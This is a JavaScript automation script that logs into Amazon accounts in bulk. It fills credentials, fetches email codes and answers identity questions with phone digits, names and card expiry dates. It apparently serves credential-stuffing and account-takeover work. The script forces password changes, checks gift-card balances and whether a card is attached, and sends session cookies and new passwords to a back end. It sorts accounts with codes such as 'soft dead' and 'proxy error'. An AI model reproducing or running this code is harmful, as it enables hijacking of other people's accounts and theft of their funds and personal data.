FBO.subscribeFboMessage(function(msg) {
	if (msg.type != 'CAP') {
		return;
	}
	console.log("auto_login.js start after got fbo captcha message", msg);

	function reportResult(res, res_msg) {
		if (window.localStorage.getItem("realChangePwd")) {
			needChangePwd = true;
		}

		var obj = {
			"type" : "1",
			"data" : res,
			"email" : FBO.getEmail()
		};
		FBO.accessPost("/commonDr", JSON.stringify(obj), "application/json");

		if (needChangePwd) {
			window.localStorage.setItem("changePwd", "1");
			console.log("send change pwd request");
			FBO.accessPost("/changePwd", JSON.stringify({
				"email" : FBO.getEmail(),
				"pwd" : FBO.getPassword() + "1"
			}), "application/json");
		}

		FBO.reportCookie();

		FBO.createFboMessage({
			"type": "LOGIN",
			"data": {
				"msg": res_msg,
				"code": res
			}
		});

		window.alert(res + " " + res_msg);
	}

	if (msg.data == 'CAP_ERROR') {
		console.log("captcha error");
		reportResult(-6, "LOGIN_ERROR_CAP");
		return;
	}
	
	var needChangePwd = false;
	if (window.localStorage.getItem("realChangePwd")) {
		needChangePwd = true;
	}

	/*
	1 normal
	2 soft dead
	17 billing issue
	-1 get phone failed
	-2 account lock
	-3 no cc attached
	-4 proxy error
	-5 try again later
	-6 captcha
	-7 email code error
	-8 no email in amazon
	*/

	var needReset = window.localStorage.getItem("needResetPwd");
	if (needReset) {
		if (document.querySelector('#auth-fpp-link-bottom')) {
			console.log("force fpp change");
			document.querySelector('#auth-fpp-link-bottom').click();
			return;
		}
	}

	if (document.querySelector('#cvf-skip-claim-collect-section a')) {
		document.querySelector('#cvf-skip-claim-collect-section a').click();
		return;
	}

	if (document.querySelector('.cvf-widget-alert-message')) {
		var txt = document.querySelector('.cvf-widget-alert-message').innerText;
		if (txt.indexOf('Código no válido') != -1 || txt.indexOf('Code n') != -1) {
			console.log("invalid email code");
			reportResult(-7, "LOGIN_ERROR_EMAIL_CODE");
			return;
		}
	}

	var rm = document.querySelector('input[name="rememberMe"]');
	if (rm) {
		rm.checked = 'checked';
	}

	if (window.location.href.indexOf("orderFilter=archived&") != -1) {
		console.log("load archived page");
		reportResult(1, "LOGIN_OK");
		return;
	}

	if (document.querySelector('p.gc-balance-on-mobile')) {
		console.log("load balance mobile page");
		reportResult(1, "LOGIN_OK");
		return;
	}

	if (document.querySelector('#gc-ui-balance-gc-balance-value')
			|| document.querySelector('div.gcBalanceBox')) {
		console.log("account login succ");
		reportResult(1, "LOGIN_OK");
		return;
	}

	if (window.location.href.indexOf("mycd/myx#") != -1) {
		console.log("find mycd/myx#");
		reportResult(17, "LOGIN_ERROR_MYX");
		return;
	}

	if (document.querySelector('body').innerText == '') {
		console.log("proxy error");
		reportResult(-4, "LOGIN_ERROR_PROXY");
		return;
	}

	var switchLink = document.querySelector('a[data-name="switch_account_request"]');
	if (switchLink) {
		console.log("switch account");
		switchLink.click();
		return;
	}

	var errDiv = document.querySelector('div.cvf-widget-alert-id-cvf-dcq-error');
	if (errDiv) {
		if (errDiv.innerHTML.indexOf('again later') != -1
			|| errDiv.innerHTML.indexOf('hai effettuato troppi tentativi') != -1
			|| errDiv.innerHTML.indexOf('has realizado demasiados intentos fallidos.') != -1
			|| errDiv.innerHTML.indexOf('vous avez fait trop de tentatives infructueuses.') != -1
			|| errDiv.innerHTML.indexOf('has hecho demasiados intentos fallidos.') != -1
			|| errDiv.innerHTML.indexOf('you\'ve made too many failed attempts')) {
			console.log("try again later");
			reportResult(-5, "LOGIN_ERROR_TRY_AGAIN");
			return;
		}
		return;
	}

	var authErrorMsg = document.querySelector('#auth-error-message-box');
	if (authErrorMsg) {
		if (authErrorMsg.innerHTML.indexOf('Your password is incorrect') != -1
			|| authErrorMsg.innerHTML.indexOf('Your password is incorrect') != -1
			|| authErrorMsg.innerHTML.indexOf('password was incorrect') != -1) {
			console.log("find password incorrect");
			var fpLink = document.querySelector('#auth-fpp-link-bottom');
			if (fpLink) {
				console.log("click forgot");
				fpLink.click();
				return;
			}
		} else if (authErrorMsg.innerHTML.indexOf('different password') != -1) {
			console.log("need another password");
			needChangePwd = true;
		} else if (authErrorMsg.innerHTML.indexOf('Account locked') != -1) {
			console.log("locked");
			reportResult(-2, "LOGIN_ERROR_ACCOUNT_LOCKED");
			return;
		} else if (authErrorMsg.innerHTML.indexOf('again later') != -1) {
			console.log("try again later");
			reportResult(-5, "LOGIN_ERROR_TRY_AGAIN");
			return;
		} else if (authErrorMsg.innerHTML.indexOf('again tommo') != -1) {
			console.log("try again later");
			reportResult(-5, "LOGIN_ERROR_TRY_AGAIN");
			return;
		} else if (authErrorMsg.innerHTML.indexOf('has alcanzado el número máximo') != -1) {
			console.log("try again later");
			reportResult(-5, "LOGIN_ERROR_TRY_AGAIN");
			return;
		} else if (authErrorMsg.innerHTML.indexOf("We're sorry. We weren't able to identify you given the information provided.") != -1) {
			console.log("no email in amazon");
			reportResult(-8, "LOGIN_ERROR_CANNOT_FIND_ACCOUNT");
			return;
		} else if (authErrorMsg.innerHTML.indexOf("Impossibile identificare l'account unicamente con le informazioni fornite") != -1) {
			console.log("no email in amazon");
			reportResult(-8, "LOGIN_ERROR_CANNOT_FIND_ACCOUNT");
			return;
		} else if (authErrorMsg.innerHTML.indexOf("identifizieren") != -1) {
			console.log("no email in amazon");
			reportResult(-8, "LOGIN_ERROR_CANNOT_FIND_ACCOUNT");
			return;
		} else if (authErrorMsg.innerHTML.indexOf("No hemos podido identificar") != -1) {
			console.log("no email in amazon");
			reportResult(-8, "LOGIN_ERROR_CANNOT_FIND_ACCOUNT");
			return;
		} else {
			console.log("do not know error");
			return;
		}
	}

	var authSuccMsg = document.querySelector('#auth-success-message-box');
	if (authSuccMsg && !FBO.getEmailNew()) {
		console.log("change succ but does not login automatically");
		reportResult(2, "LOGIN_ERROR_SOFT_DEAD");
		return;
	}

	var emailInput = document.querySelector('#ap_email');
	if (emailInput) {
		emailInput.value = callbackObj.getEmail();
	}

	var pwdInput = document.querySelector('#ap_password');
	if (pwdInput) {
		pwdInput.value = callbackObj.getAmzPwd();
	}

	var signInput = document.querySelector('#signInSubmit');
	if (signInput) {
		console.log("click signin");
		signInput.click();
		return;
	}

	var verifyEmailCodeInput = document.querySelector('form[action="verify"] input[name="code"]');
	if (verifyEmailCodeInput) {
		console.log("going to get email verify code");
		setTimeout(function(){
			var cc = callbackObj.getEmailCode();
			verifyEmailCodeInput.value = cc;
			if (cc.trim().indexOf("ERROR") != -1) {
				console.log("get email failed");
				reportResult(-7, "LOGIN_ERROR_EMAIL_CODE");
				return;
			}
			var verifyInputSubmit = document.querySelector('form[action="verify"] input[type="submit"]');
			verifyInputSubmit.click();
		}, 10000);
		return;
	}

	var verifyQuestionInput = document.querySelector('form[action="verify"] input[name="dcq_question_subjective_1"]');
	if (verifyQuestionInput) {
		console.log("going to input verify question");
		if (document.querySelector('form[action="verify"] input[value="ap_dcq_question_phone_tail_hint"]')) {
			console.log("going to input phone for hint");
			verifyQuestionInput.value = FBO.getPhoneEnd(document.querySelector("span.dcq_hint").innerText.trim());

			if (verifyQuestionInput.value.trim() == "" || verifyQuestionInput.value.trim() == "NO") {
				console.log("get phone failed");
				reportResult(-1, "LOGIN_ERROR_PHONE_FAILED");
				return;
			}
		}
		if (document.querySelector('form[action="verify"] input[value="ap_dcq_question_name_label"]')) {
			console.log("going to input full name");
			verifyQuestionInput.value = FBO.getPublicName();
		}
		var verifyInputSubmit = document.querySelector('form[action="verify"] input[type="submit"]');
		verifyInputSubmit.click();
		return;
	}

	var formFpInput = document.querySelector('form[name="forgotPassword"] input[type="submit"]');
	if (formFpInput) {
		var fpI1 = document.querySelector('#ap_fpp_password');
		var fpI2 = document.querySelector('#ap_fpp_password_check');
		if (fpI1) {
			fpI1.value = callbackObj.getAmzPwd();
			if (needChangePwd) {
				fpI1.value = fpI1.value + "1";
				window.localStorage.setItem("realChangePwd", "1");
			}
		}
		if (fpI2) {
			fpI2.value = callbackObj.getAmzPwd();
			if (needChangePwd) {
				fpI2.value = fpI2.value + "1";
				window.localStorage.setItem("realChangePwd", "1");
			}
		}
		formFpInput.click();
		return;
	}

	var mS = document.querySelector('select[name="dcq_question_date_picker_1_1"]');
	if (mS) {
		if (!FBO.getCcMonth()) {
			console.log("no card found");
			reportResult(-3, "LOGIN_ERROR_NO_CARD");
			return;
		}
		var month = FBO.getCcMonth().trim();
		if (month.length == 1) {
			month = "0" + month;
		}
		var mO = mS.querySelector('option[value="' + month + '"]');
		mS.selectedIndex = mO.index;
	}

	var yS = document.querySelector('select[name="dcq_question_date_picker_1_2"]');
	if (yS) {
		var year = FBO.getCcYear().trim();
		var yO = yS.querySelector('option[value="' + year + '"]');
		yS.selectedIndex = yO.index;
	}

	if (yS) {
		document.querySelector('input[name="cvfDcqAction"]').click();
		return;
	}

	var clickSetNewPwdContinue = document.querySelector('#authportal-main-section input[type="submit"]');
	if (clickSetNewPwdContinue) {
		clickSetNewPwdContinue.click();
		return;
	}

	var formForDocInput = document.querySelector('form[action*="reinstate.amazon"]');
	if (formForDocInput) {
		console.log("find hard dead for 17");
		reportResult(17, "LOGIN_ERROR_MYX");
		return;
	}

	var claimspickerInput = document.querySelector('form[name="claimspicker"] input[type="submit"]');
	if (claimspickerInput) {
		claimspickerInput.click();
		return;
	}

	var nowNowMobile = document.querySelector('a.cvf-widget-link-claim-collect-skip');
	if (nowNowMobile && nowNowMobile.innerHTML.indexOf('Not now') != -1) {
		nowNowMobile.click();
		return;
	}

});
